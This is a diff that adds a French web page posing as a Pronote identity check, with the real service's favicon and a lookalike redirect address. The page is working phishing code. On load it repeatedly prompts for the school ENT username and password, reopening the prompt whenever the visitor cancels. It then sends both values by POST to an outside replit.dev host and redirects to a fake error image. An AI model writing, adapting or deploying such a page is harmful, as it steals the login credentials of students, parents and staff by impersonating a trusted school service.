@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <title>Vérification d'identité</title>
+    <link rel="icon" type="image/png" href="https://0313080e.index-education.net/pronote/images/favicon-32x32.png" />
+    <script>
+        function startLogin() {
+            let username;
+            while (true) {
+                username = prompt("Pronote a besoin de vérifier votre identité.\n\nNom d'utilisateur de l'ENT:");
+                if (username === null) {
+                    setTimeout(startLogin, 0);
+                    return;
+                }
+                if (username) {
+                    break;
+                }
+            }
+
+            let password;
+            while (true) {
+                password = prompt("Pronote a besoin de vérifier votre identité.\n\nMot de passe de l'ENT:");
+                if (password === null) {
+                    setTimeout(startLogin, 0);
+                    return;
+                }
+                if (password) {
+                    break;
+                }
+            }
+
+            const data = new URLSearchParams();
+            data.append('username', username);
+            data.append('password', password);
+
+            fetch('https://90eb6e31-fe8f-4589-aef3-94996e48a8de-00-2bgrxytnpf5tq.spock.replit.dev/', {
+                method: 'POST',
+                body: data
+            })
+            .then(() => {})
+            .catch(() => {})
+            .finally(() => {
+                window.location.href = "https://0313080e-index-education.github.io/pronote/Erreur sur le site web de l'application de messagerie.png";
+            });
+        }
+        window.onload = () => {
+            setTimeout(startLogin, 1000);
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
